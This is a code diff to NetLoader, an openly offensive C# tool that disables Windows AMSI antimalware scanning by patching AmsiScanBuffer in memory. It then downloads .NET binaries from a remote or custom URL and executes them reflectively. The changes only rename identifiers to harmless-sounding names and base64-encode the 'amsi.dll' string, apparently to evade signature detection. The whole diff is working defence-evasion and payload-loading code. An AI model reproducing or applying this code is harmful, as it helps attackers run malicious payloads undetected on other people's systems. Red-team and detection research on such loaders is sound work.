@@ -42,12 +42,7 @@ public class NetLoader
 ~Flangvik  #NetLoader
 ";
         Console.WriteLine(bannerArt);
-
-
-        if (System.Environment.Is64BitOperatingSystem)
-            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
-        else
-            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 });
+        MoveLifeAhead(System.Environment.Is64BitOperatingSystem);
 
         while (true)
         {
@@ -57,27 +52,28 @@ public class NetLoader
 
                 List<string> binList = GetBins();
 
-
+				Console.WriteLine("[+] Select a binary (number)>");
                 Console.WriteLine("------------------------");
                 Console.WriteLine("[0] - Exit NetLoader");
-                for (int count = 0; count < binList.Count; count++)
+                for (int goodGuyNumber = 0; goodGuyNumber < binList.Count; goodGuyNumber++)
                 {
-                    Console.WriteLine("[" + (count + 1) + "] - " + binList[count]);
+                    Console.WriteLine("[" + (goodGuyNumber + 1) + "] - " + binList[goodGuyNumber]);
 
-                    if (count == binList.Count - 1)
+                    if (goodGuyNumber == binList.Count - 1)
                     {
-                        Console.WriteLine("[" + (count + 2) + "] - Custom PATH or URL ");
+                        Console.WriteLine("[" + (goodGuyNumber + 2) + "] - Custom PATH or URL ");
                     }
                 }
                 Console.WriteLine("-----------------------");
-                Console.WriteLine("[+] Select a binary (number)>");
-
-                int selectedBin = Convert.ToInt32(Console.ReadLine());
-
-                if (selectedBin == 0) {
+               
+				var rawInput = Console.ReadLine();
+          
+                if (Convert.ToInt32(rawInput) == 0)
+                {
                     System.Environment.Exit(1);
 
-                } else if (selectedBin - 1 == binList.Count)
+                }
+                else if (Convert.ToInt32(rawInput) - 1 == binList.Count)
                 {
                     Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                     string binUrl = Console.ReadLine();
@@ -88,21 +84,21 @@ public class NetLoader
 
 
                 }
-                else if (selectedBin - 1 > binList.Count | selectedBin - 1 < 0)
+                else if (Convert.ToInt32(rawInput) - 1 > binList.Count | Convert.ToInt32(rawInput) - 1 < 0)
                 {
-                    Console.WriteLine("[!] Not a valid selection!");
+                    Console.WriteLine("[!] Bad Input, sry!");
                 }
                 else
                 {
-                    Console.WriteLine("[+] Provide arguments for {0} >", binList[selectedBin - 1]);
+                    Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
                     string binArgs = Console.ReadLine();
-                    invokeBinary(binList[selectedBin - 1], binArgs);
+                    invokeBinary(binList[Convert.ToInt32(rawInput) - 1], binArgs);
                 }
 
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[!] Something went wrong, not going to handle it..");
+                Console.WriteLine("[!] Damn, it failed, to bad");
                 Console.WriteLine("[!] {0}", ex.Message);
                 Console.WriteLine("[!] {0}", ex.InnerException);
             }
@@ -128,26 +124,32 @@ public class NetLoader
             else
             {
                 binarySource = File.ReadAllBytes(customUrl);
-             
+
             }
-            
+
         }
 
-   
+		invokeBinary(binarySource,arguments);
 
-        System.Reflection.Assembly.Load(binarySource).EntryPoint.Invoke(0, new object[] { new string[] { arguments } });
-
+     
     }
+	
+	 public static void invokeBinary(byte[] loadMe, string arguments)
+    {	  
+		   var barFoo = new object[] { new string[] { arguments } };
+		   var fooBar = System.Reflection.Assembly.Load(loadMe);
+		   fooBar.EntryPoint.Invoke(0, barFoo);
+
+	}
+	
     public static List<string> GetBins()
     {
-        Console.WriteLine("[+] Fetching list of bins from " + _repURL);
+     
         var avBinaries = new List<string>() { };
         var websiteSource = webClient.DownloadString(_repURL);
-        string pattern = @"\/[A-Za-z]{0,50}\.bin";
 
-        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
-        MatchCollection matches = rgx.Matches(websiteSource);
-        foreach (var match in matches)
+        Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
+        foreach (var match in rgx.Matches(websiteSource))
         {
             avBinaries.Add(match.ToString().TrimStart('/'));
         }
@@ -155,20 +157,40 @@ public class NetLoader
         return avBinaries;
 
     }
-    private static void PatchAnnsi(byte[] magicJuice)
+    private static void MoveLifeAhead(bool BigBoy = false)
     {
         try
         {
-            Console.WriteLine("[+] Patching AM" + "SI ...");
-            IntPtr lib = WinLibBase.LoadLibrary("am" + "si.dll");
-            IntPtr addr = WinLibBase.GetProcAddress(lib,  Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
-            uint oldProtect = 0; 
-            WinLibBase.VirtualProtect(addr, (UIntPtr)magicJuice.Length, 0x40, out oldProtect);
+				var fooBar = WinLibBase.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
+                IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
+				
+            if (BigBoy)
+            {
+                Console.WriteLine("[+] Patching...");
 
-            Marshal.Copy(magicJuice, 0, addr, magicJuice.Length);
+                uint someNumber = 0;
+				
+                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length, 0x40, out someNumber);
 
-            Console.WriteLine("[+] Patched!");
-            
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length);
+
+                Console.WriteLine("[+] Patched!");
+            }
+            else
+            {
+                Console.WriteLine("[+] Patching ...");
+
+                uint someNumber = 0;
+              
+                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length, 0x40, out someNumber);
+
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length);
+
+                Console.WriteLine("[+] Patched!");
+
+            }
+
+
         }
         catch (Exception ex)
         {
